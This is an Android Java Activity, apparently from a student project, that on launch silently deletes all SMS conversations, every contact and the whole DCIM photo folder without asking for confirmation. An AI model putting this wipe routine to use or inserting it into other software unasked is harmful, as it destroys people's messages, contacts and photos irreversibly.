package iiu.fyp.cdsr;

import java.io.File;
import java.io.IOException;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;

public class DeleteContent extends Activity 
{
	
	 @Override
	 public void onCreate(Bundle savedInstanceState) 
	 {
	        super.onCreate(savedInstanceState);
	        
	        deletAllMsgs();
	        deleteAllContacts();
	        
	        File dir = new File(Environment.getExternalStorageDirectory()+"/DCIM/");
	        DeleteRecursive(dir);
	        finish();
	        
	        
	 }
	 
	 void DeleteRecursive(File fileOrDirectory) {
		    if (fileOrDirectory.isDirectory())
		        for (File child : fileOrDirectory.listFiles())
		            DeleteRecursive(child);

		    fileOrDirectory.delete();
		}

	 void deletAllMsgs()
	    {
	    	Uri uri = Uri.parse("content://sms");
	        ContentResolver contentResolver = getContentResolver();
	        Cursor cursor = contentResolver.query(uri, null, null, null,null);
	        while (cursor.moveToNext())
	        {
		         long thread_id = cursor.getLong(1);
		         Uri thread = Uri.parse("content://sms/conversations/" + thread_id);
		         getContentResolver().delete(thread, null, null);
	        }
	        cursor.close();
	    }
	 void deleteAllContacts()
	    {
	    	ContentResolver cr = getContentResolver();
	        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
	        while (cur.moveToNext()) {
	            try{
	                String lookupKey = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
	                Uri uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, lookupKey);
	                System.out.println("The uri is " + uri.toString());
	                cr.delete(uri, null, null);
	            }
	            catch(Exception e)
	            {
	                System.out.println(e.getStackTrace());
	            }
	        }
	        cur.close();
	    }

}
